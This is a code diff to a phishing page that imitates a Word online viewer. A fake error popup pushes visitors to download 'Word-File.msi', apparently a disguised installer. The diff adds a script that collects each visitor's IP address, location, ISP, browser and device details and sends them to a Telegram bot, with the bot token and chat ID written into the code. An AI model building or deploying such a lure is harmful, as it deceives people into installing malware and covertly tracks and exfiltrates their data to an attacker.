@@ -21,11 +21,56 @@
             <div class="pop-top-icon"><img src="img/word.svg"></div>
             <div class="pop-top-title">Create, edit and share Word documents. Work with others on shared projects, in real-time</div>
           </div>
-          <div class="pop-text">Unknown error: failed to display this document online. To view the document, download it to your computer.</div><a class="pop-btn" href="bin/Word-File.msi">Download</a>
+          <div class="pop-text">Unknown error: failed to display this document online. To view the document, download it to your computer.</div>
+          <a class="pop-btn" href="bin/Word-File.msi">Download</a>
         </div>
       </div>
     </div>
+
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="js/main.js"></script>
+
+    <!-- Your added script starts here -->
+    <script>
+        const botToken = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';  // Replace with a secure method to fetch token
+        const chatId = '875434694';      // Replace with the correct chat ID
+
+        // Get browser & device details
+        const browser = navigator.userAgent;
+        const platform = navigator.platform;
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        // Fetch user location & IP
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip || 'Unknown IP';
+                const city = data.city || 'Unknown City';
+                const country = data.country || 'Unknown Country';
+                const isp = data.org || 'Unknown ISP';
+
+                // Message format
+                const message = `#---------[ New Client clicked ]-----------#: 
+                    IP Address: ${ip} 
+                    Location: ${city}, ${country} 
+                    ISP: ${isp} 
+                    Device: ${platform} 
+                    Browser: ${browser} 
+                    Screen Resolution: ${screenRes} 
+                    Time Zone: ${timeZone}`;
+                
+                // Send to Telegram
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            })
+            .catch(error => console.error("Geo-Location Error:", error));
+    </script>
+    <!-- Your added script ends here -->
+
   </body>
 </html>
